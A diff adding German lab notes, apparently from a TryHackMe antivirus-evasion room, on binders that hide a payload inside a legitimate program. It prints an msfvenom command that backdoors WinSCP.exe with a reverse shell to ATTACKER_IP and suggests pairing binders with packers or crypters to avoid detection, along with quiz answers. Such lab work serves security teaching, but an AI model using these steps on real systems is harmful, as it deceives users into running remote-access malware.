@@ -1066,3 +1066,53 @@ Folgen Sie den Anweisungen, um einen gepackten Payload zu erstellen und ihn auf 
 ```
 Keine Antwort nötig
 ```
+
+# Task 10 - Binders
+Obwohl keine AV-Umgehungsmethode, sind Binder auch wichtig bei der Gestaltung eines bösartigen Payloads zur Verteilung an Endbenutzer. Ein Binder ist ein Programm, das zwei (oder mehr) ausführbare Dateien zu einer einzigen zusammenfügt. Er wird oft verwendet, um Ihren Payload innerhalb einer bekannten Anwendung zu verteilen, um Benutzer zu täuschen und glauben zu lassen, dass sie eine andere Anwendung ausführen.  
+![Diagramm des Prozesses zur Bindung von ausführbaren Dateien](Bilder/2024-07-05-Diagramm-des-Prozesses-zur-Bindung-von-ausführbaren-Dateien.png)
+
+Obwohl jeder Binder etwas anders funktionieren kann, fügen sie im Wesentlichen den Code Ihres Shellcodes in das legitime Programm ein und lassen ihn irgendwie ausführen.
+
+Beispielsweise könnten Sie den Einstiegspunkt im PE-Header ändern, damit Ihr Shellcode direkt vor dem Programm ausgeführt wird, und dann die Ausführung nach Abschluss wieder zum legitimen Programm zurückleiten. Auf diese Weise wird beim Klicken auf die resultierende ausführbare Datei Ihr Shellcode zuerst still ausgeführt, und das Programm läuft normal weiter, ohne dass der Benutzer es bemerkt.
+
+### Binding mit msfvenom
+
+Sie können mit `msfvenom` ganz einfach einen Payload Ihrer Wahl in jede .exe-Datei einpflanzen. Die Binärdatei funktioniert weiterhin wie gewohnt, führt jedoch zusätzlich einen Payload still aus. Die von msfvenom verwendete Methode injiziert Ihr bösartiges Programm, indem es einen zusätzlichen Thread dafür erstellt. Dies ist etwas anders als das zuvor Erwähnte, erreicht jedoch das gleiche Ergebnis. Ein separater Thread ist sogar besser, da Ihr Programm nicht blockiert wird, falls Ihr Shellcode aus irgendeinem Grund fehlschlägt.
+
+Für diese Aufgabe werden wir die WinSCP.exe rückseitig bearbeiten, die unter `C:\Tools\WinSCP` verfügbar ist.
+
+Um eine rückseitige WinSCP.exe zu erstellen, verwenden wir den folgenden Befehl auf unserem Windows-Rechner:
+
+Hinweis: Metasploit ist auf dem Windows-Rechner zur Vereinfachung installiert, aber die Generierung des Payloads kann bis zu drei Minuten dauern (die produzierten Warnungen können sicher ignoriert werden).
+```cmd
+C:\> msfvenom -x WinSCP.exe -k -p windows/shell_reverse_tcp lhost=ATTACKER_IP lport=7779 -f exe -o WinSCP-evil.exe
+```
+
+Die resultierende WinSCP-evil.exe wird einen reverse_tcp Meterpreter Payload ausführen, ohne dass der Benutzer es bemerkt. Bevor Sie etwas anderes tun, denken Sie daran, einen `nc` Listener einzurichten, um die Reverse-Shell zu empfangen. Wenn Sie Ihre modifizierte ausführbare Datei ausführen, sollte sie eine Reverse-Shell zu Ihnen zurück starten, während WinSCP.exe weiterhin für den Benutzer ausgeführt wird.  
+![Auführung von einer Payload](Bilder/2024-07-05-Auführung-von-einer-Payload.png)
+
+### Binders und AV
+
+Binder werden nicht viel dazu beitragen, Ihren Payload vor einer AV-Lösung zu verbergen. Die einfache Tatsache, dass zwei ausführbare Dateien ohne Änderungen zusammengefügt werden, bedeutet, dass die resultierende ausführbare Datei immer noch jede Signatur auslösen wird, die der ursprüngliche Payload ausgelöst hätte.
+
+Der Hauptzweck von Bindern besteht darin, Benutzer dazu zu bringen zu glauben, dass sie eine legitime ausführbare Datei ausführen, anstatt einen bösartigen Payload.
+
+Bei der Erstellung eines echten Payloads möchten Sie möglicherweise Encoder, Crypter oder Packer verwenden, um Ihren Shellcode vor signaturbasierten AVs zu verbergen, und ihn dann in eine bekannte ausführbare Datei binden, sodass der Benutzer nicht weiß, was ausgeführt wird.
+
+Versuchen Sie gerne, Ihre gebundene ausführbare Datei auf der THM Antivirus Check-Website (Link auf Ihrem Desktop verfügbar) ohne Verpackung hochzuladen. Sie sollten eine Erkennung vom Server zurückbekommen. Diese Methode wird also nicht besonders hilfreich sein, wenn Sie versuchen, die Flagge vom Server selbst zu erhalten.
+
+## Fragen:
+Wird ein Binder helfen, AV-Lösungen zu umgehen? (nay)
+```
+
+```
+
+Kann ein Binder verwendet werden, um einen Payload als legitime ausführbare Datei erscheinen zu lassen? (yea)
+```
+
+```
+
+# Task 11 - Abschluss
+In diesem Raum haben wir einige Strategien erkundet, die einem Angreifer zur Verfügung stehen, um AV-Engines zu umgehen, die ausschließlich auf der Erkennung auf der Festplatte basieren. Obwohl dies nur einer der Mechanismen ist, die jeder modernen AV-Engine zur Verfügung stehen, sollten wir zumindest unsere Payloads auf die Festplatte unseres Opfers übertragen können. Das [Umgehen der Erkennung im Speicher und anderer fortschrittlicher Erkennungsmechanismen](https://tryhackme.com/r/room/runtimedetectionevasion) bleibt einem zukünftigen Raum vorbehalten. Möglicherweise möchten Sie die Runtime Detection Evasion für weitere Informationen über das Umgehen weiterer Windows-Sicherheitsmechanismen überprüfen, die verhindern könnten, dass Ihre Payloads ausgelöst werden.
+
+Denken Sie daran, dass der Erfolg eines Verschlüsselers, Encoders oder Packers weitgehend davon abhängt, dass AV-Engines keine Signaturen dafür kennen. Daher ist es entscheidend, Ihre eigenen Payloads anpassen zu können, wenn Sie versuchen, jede realitätsnahe Lösung zu umgehen.
